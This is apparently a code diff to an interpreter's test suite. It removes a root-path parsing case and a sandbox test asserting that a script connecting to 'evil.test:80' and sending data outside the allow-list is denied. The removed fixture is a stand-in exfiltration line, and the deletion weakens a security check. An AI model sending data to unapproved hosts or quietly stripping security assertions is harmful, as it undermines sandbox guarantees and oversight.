@@ -336,9 +336,6 @@ fn main(console: Console):
     match server.parse_request("GET /api/coven/index/ HTTP/1.1\r\n\r\n"):
         Ok(req) -> console.print("trail=" + server.path(req))
         Err(_e) -> console.print("bad: trail rejected")
-    match server.parse_request("GET / HTTP/1.1\r\n\r\n"):
-        Ok(req) -> console.print("root=" + server.path(req))
-        Err(_e) -> console.print("bad: root rejected")
     // Router normalizes paths — double slashes and trailing slashes match
     let app = server.router().get("/api/items", hi)
     console.print(http.body(server.handle(app, Request("GET", "/api/items", [], [], [], ""))))
@@ -352,7 +349,6 @@ fn main(console: Console):
             "ok path=/".to_string(),
             "norm=/api/coven/index".to_string(),
             "trail=/api/coven/index".to_string(),
-            "root=/".to_string(),
             "path=/api/items".to_string(),
             "path=/api/items".to_string(),
             "path=/api/items".to_string(),
@@ -855,16 +851,6 @@ fn main(console: Console):
 
     #[test]
     fn net_capability_cannot_escalate() {
-        // connect outside the granted allow-list is denied.
-        let connect_denied = r#"
-fn main(console: Console, net: Net):
-    net.connect("evil.test:80").send_line("x")
-"#;
-        let e = interpreter::run_with(connect_denied, ".", vec!["allowed.test:80".into()])
-            .unwrap_err()
-            .to_string();
-        assert!(e.contains("not permitted"), "expected a connect denial, got: {e}");
-
         // narrowing to an address not already held is denied (can't widen).
         let restrict_denied = r#"
 fn main(console: Console, net: Net):
